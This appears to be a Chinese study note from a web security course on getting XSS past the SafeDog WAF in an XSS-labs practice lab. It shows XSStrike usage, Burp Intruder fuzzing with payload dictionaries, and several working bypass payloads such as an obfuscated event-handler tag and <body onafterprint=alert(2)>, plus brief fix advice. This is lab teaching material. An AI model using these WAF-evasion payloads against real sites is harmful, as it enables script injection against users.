![](https://gitee.com/YatJay/image/raw/master/img/202203061340141.png)

# 涉及知识

## 常见WAF绕过思路

### 标签语法替换



### 特殊符号干扰



### 提交方式更改



### 垃圾数据溢出



### 加密解密算法



### 结合其他漏洞绕过



## 自动化工具XSStrike说明

### 工具介绍

XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。

XSStrike主要特点：反射和DOM XSS扫描

### 主要功能

- 多线程爬虫
- context分析
- 可配置的核心
- 检测和规避wAF
- 老旧的JS 库扫描
- 智能payload生成器
- 手工制作的 HTML & JavaScript解析器
- 强大的fuzzing引擎
- 盲打xss支持
- 高效的工作流
- 完整的HTTP支持
- Bruteforce payloads支持
- Payload 编码

### 工具使用——常用参数

```bash
-h, --help 			//显示帮助信息
-u, --url 			//指定目标 URL
--data 					//POST 方式提交内容
-v, --verbose 	//详细输出
-f, --file 			//加载自定义 paload 字典
-t, --threads 	//定义线程数
-l, --level 		//爬行深度
-t, --encode 		//定义 payload 编码方式
--json 					//将 POST 数据视为 JSON
--path 					//测试 URL 路径组件
--seeds 				//从文件中测试、抓取 URL
--fuzzer 				//测试过滤器和 Web 应用程序防火墙。
--update 				//更新
--timeout 			//设置超时时间
--params 				//指定参数
--crawl 				//爬行
--proxy 				//使用代理
--blind 				//盲测试
--skip 					//跳过确认提示
--skip-dom 			//跳过 DOM 扫描
--headers 			//提供 HTTP 标头
-d, --delay 		//设置延迟
```

参考资料：[XSStrike中文手册(自学笔记)](https://blog.csdn.net/lady_killer9/article/details/109105084)

## 安全修复方案

- 开启HttpOnly

- 输入过滤：对前端提交来的参数进行过滤，比如不接收`<script>`

- 输出过滤：后端处理后，对输出到前端的内容进行过滤，比如不输出`<script>`

- PHP、Java的XSS防护方案参考文章

  - PHP:http://www.zuimoge.com/212.html

  - JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html

## JAVA XSS平台练习

无

# 演示案例

Windows Server虚拟机安装phpstudy、网站安全狗，搭建XSSlabs练习平台进行测试

### 手工探针XSS绕过WAF规则

以XSSlabs的Level-1为例进行WAF规则测试，已知Level-1提交的参数是GET方式，参数名为name

直接提交XSS脚本，被WAF拦截

```
http://192.168.137.128/pentest/xsslabs/level1.php?name=<script>alert(1)</script>
```

![](https://gitee.com/YatJay/image/raw/master/img/202203061938585.png)

先后分别提交name值为`<script>alert(1)`、`alert(1)</script>`、`<script>`都会被拦截，当提交`<script`、`<>`时不会拦截，推测WAF检测的是首尾两个尖括号，若两个尖括号内存在攻击性内容，则会拦截，即不允许提交有害标签语句

==//////////==00:38:00结束开始

### 自动化XSS绕过WAF测试演示

#### 安装

XSStrike只可以运行在python 3.6 以上版本

2、下载XSStrike，命令如下：

```
git clone https://github.com/s0md3v/XSStrike.git
```

由于本机的Python配置，Python3的pip命令执行时需要`python3 -m pip install xxx`，于是在XSStrike目录下安装相应依赖模块，命令如下：

```bash
python3 -m pip install -r requirements.txt
```

4、运行工具，命令如下：

```bash
python3 xsstrike.py -u "http://target"
```

#### 测试

输入命令，对`http://192.168.137.128/pentest/xsslabs/level1.php?name=`网页进行测试

```bash
python3 xsstrike.py -u "http://192.168.137.128/pentest/xsslabs/level1.php?name="
```

![](https://gitee.com/YatJay/image/raw/master/img/202203062016939.png)

可以看到该工具给出了一些可用的payload，选取一个进行XSS提交测试

```
http://192.168.137.128/pentest/xsslabs/level1.php?name=%20%3CA%0dONpOInterenter+=+[8].find(confirm)%3E
```

![](https://gitee.com/YatJay/image/raw/master/img/202203062045470.png)

测试过程中如果安全狗提示请求过于频繁，关闭网站流量防护--CC攻击防护

参考资料：[XSStrike中文手册(自学笔记)](https://blog.csdn.net/lady_killer9/article/details/109105084)

### Fuzz下XSS绕过WAF测试演示

使用burp配合fuzz字典中的XSS的fuzz字典，对提交的XSS参数做fuzz测试，测试payload

以XSSlabs的Level-1为例进行测试，随意提交一个参数之后抓包，发送到intruder模块进行连续发包测试

![](https://gitee.com/YatJay/image/raw/master/img/202203062103587.png)

在GET提交参数处添加$$以及payload，字典选取fuzzDicts的easyXssPayload目录中的XSS的fuzz字典

![](https://gitee.com/YatJay/image/raw/master/img/202203062106853.png)

查看发包测试结果

Length列代表返回值的长度

一般返回长度较长(4位数)的就是安全狗拦截页面

返回长度较短的(3位数)的就是成功绕过WAF的返回页面

![](https://gitee.com/YatJay/image/raw/master/img/202203062124862.png)

选择一个可用的payload提交测试，如提交`<body onafterprint=alert(2)>`即

```
http://192.168.137.128/pentest/xsslabs/level1.php?name=<body onafterprint=alert(2)>
```

注意：

- onafterprint 事件在页面打印后触发，或者打印对话框已经关闭。
- 快捷键，如 Ctrl+P 可以设置页面打印。
- 只有 Internet Explorer 和 Firefox 浏览器支持 onafterprint 事件。
-  在 IE 中, onafterprint 事件在打印对话框出现前触发，而不是之后。

火狐浏览器提交后使用Ctrl+P 快捷键可以成功触发XSS弹窗

![](https://gitee.com/YatJay/image/raw/master/img/202203062119068.png)

如果提交的XSS脚本还需要考虑符号闭合，则需要自行添加闭合符号，比如第2关需要添加`“>`进行闭合

在第2关使用和第1关同样的payload时，就要先考虑引号、尖括号的闭合，而后再添加payload

提交后返回页面正常，使用Ctrl+P 快捷键可以成功触发XSS弹窗

![](https://gitee.com/YatJay/image/raw/master/img/202203062129383.png)

### 关于XSS 跨站安全修复建议测试

无

# 涉及资源

Java的XSS测试平台：https://gitee.com/yhtmxl/imxss/

https://github.com/3xp10it/xwaf

XSS语句FUZZ平台：https://xssfuzzer.com/fuzzer.html

https://github.com/s0md3v/XSStrike

绕过XSS检测机制：https://bbs.pediy.com/thread-250852.htm

fuzz字典项目：https://github.com/TheKingOfDuck/fuzzDicts

fuzz字典项目：https://github.com/fuzzdb-project/fuzzdb

XSStrike中文手册(自学笔记)：https://blog.csdn.net/lady_killer9/article/details/109105084)

[网站安全狗安装时总提示不能打开要写入的文件，导致程序无法完成安装](https://www.52help.net/mt/526.mhtml)